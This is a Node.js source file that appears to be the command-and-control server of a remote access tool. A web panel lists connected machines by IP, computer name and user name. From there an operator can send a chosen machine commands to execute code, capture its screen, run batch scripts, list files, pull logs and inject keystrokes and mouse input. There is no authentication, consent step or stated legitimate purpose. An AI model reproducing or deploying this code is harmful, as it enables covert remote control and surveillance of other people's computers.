//REQUIRES
var express = require("express");
var app = express();
var httpServer = require("http").Server(app);
var io = require("socket.io")(httpServer);
var fs = require("fs");
var net = require("net");
var ejs = require("ejs");
//VARS
var clientSide = null;
//TCP
const EOT = String.fromCharCode(4);//End of transmission
const ETX = String.fromCharCode(3);//End of text
const FS = String.fromCharCode(28);//File separator
var clients = [];
var server = net.createServer({}, function (socket) {
	clients.push(socket);
	socket.setEncoding("utf8");
	socket.ready = false;
	socket.name = socket.remoteAddress + ":" + socket.remotePort;
	var buffer = "";

	console.log("[TCP] client connected! " + socket.name);

	socket.write("handshake");
	socket.write(EOT);//End of transmission
	socket.write("welcome");
	socket.write(EOT);//End of transmission

	function onData(label, data) {
		console.log("[TCP] received command data!");
		switch (label) {
			case "handshake":
				data = JSON.parse(data);
				socket.data = {};
				for (var i in data) if (data.hasOwnProperty(i)) socket.data[i] = data[i];
				socket.ready = true;
				sendRefreshToClient();
				break;
			case "image":
			case "code_result":
			case "batch_result":
			case "logs":
				if (clientSide) clientSide.emit(label, data);
				break;
			case "list_files":
				if (clientSide) {
					var files = [];
					var folders = [];
					data = data.split(FS);
					var isFiles = false;
					for (var i = 0; i < data.length; i++) {
						if (data[i].length <= 0) continue;

						if (data[i] === "files") isFiles = true;
						else if (data[i] === "folders") isFiles = false;
						else if (isFiles) {
							files.push(data[i]);
						} else {
							folders.push(data[i]);
						}
					}
					clientSide.emit("list_files", {
						files: files, folders: folders
					});
				}
				break;
			case "update":
				
				break;
		}
	}

	function handlePacket(data) {
		data = data.split(ETX);
		var label = data[0];
		return onData(label, data[1]);
	}

	socket.on("data", function (data) {
		buffer += data;
		if (buffer.indexOf(EOT) !== -1) {
			buffer = buffer.split(EOT);
			for (var i = 0; i < buffer.length; i++) if (buffer[i].length > 0) handlePacket(buffer[i]);
			buffer = "";
		}
	});

	socket.on("error", function () {
		console.log("[TCP] client left by error! " + socket.name);
		var t = clients.indexOf(socket);
		if (t !== -1) {
			clients.splice(t, 1);
			sendRefreshToClient();
		}
	});

	socket.on("close", function () {
		console.log("[TCP] client left! " + socket.name);
		var t = clients.indexOf(socket);
		if (t !== -1) {
			clients.splice(t, 1);
			sendRefreshToClient();
		}
	});
});
function getClientById(id) {
	for (var i = 0; i < clients.length; i++) {
		if (clients[i].name === id) return clients[i];
	}
}
//EXPRESS
app.use(express.static("static"));
app.set('view engine', 'ejs');

app.get("/:file?", function (req, res) {
	res.header("Content-Type", "text/html");
	var file = req.params.file || "index.ejs";
	if (file.indexOf(".ejs") !== -1) {
		console.log("[HTTP] Request " + file);
		res.render(__dirname + "/views/" + file, {
			clients: clients,
			server: server,
			params: req.query
		});
	}
});
//SOCKETIO
function sendRefreshToClient() {
	if (!clientSide) return;
	var template =
		`<table id="client_list">
		<tr class="header">
			<td>IP</td>
			<td>Port</td>
			<td>Computer name</td>
			<td>User name</td>
		</tr>
		<% for (var i = 0; i < clients.length; i++) { 
			if (!clients[i].ready) continue;
			var ip = clients[i].remoteAddress.toString ().replace ("::ffff:", "");
			if (ip.startsWith ("::ffff:")) ip = ip.replace ("::ffff:", "");
		%>		
			<tr onclick="goto('manage.ejs?id=' + '<%- clients[i].name %>')">			
				<td><%= ip %></td>
				<td><%= clients[i].remotePort %></td>
				<td><%= clients[i].data.computer %></td>
				<td><%= clients[i].data.user %></td>
			</tr>
			<% } %>
    </table>`;

	clientSide.emit("refresh", {
		text: ejs.render(template, {
			clients: clients,
			server: server
		}),
		count: clients.length
	});
}

io.on("connection", function (socket) {
	console.log("[SOCKET.IO] client " + socket.request.connection.remoteAddress + " connected!");
	clientSide = socket;

	function handleSimple(cmd) {
		socket.on(cmd, (function (data) {
			console.log("[SOCKET.IO] " + cmd);
			var c = getClientById(data.id);
			if (c) {
				c.write(cmd);
				c.write(String.fromCharCode(4));
				c.write(data.text || "");
				c.write(String.fromCharCode(4));
			}
		}).bind(this));
	}

	socket.on("disconnect", function () {
		console.log("[SOCKET.IO] client disconnected!");
		clientSide = null;
	});
	handleSimple("execute_code");
	handleSimple("capture");
	handleSimple("batch");
	handleSimple("list_files");
	handleSimple("logs");
	handleSimple("key");	
	handleSimple("mouse");
	sendRefreshToClient();
});
//SERVERS
for (var i = 0; i < 100; i++) console.log();
app.listen(7070, function () {
	console.log("Server running at port 7070!");
});
httpServer.listen(7071, function () {
	console.log("Socket.IO running at port 7071!");
});
server.listen(8080, function () {
	console.log("TCP running at port 8080!");
});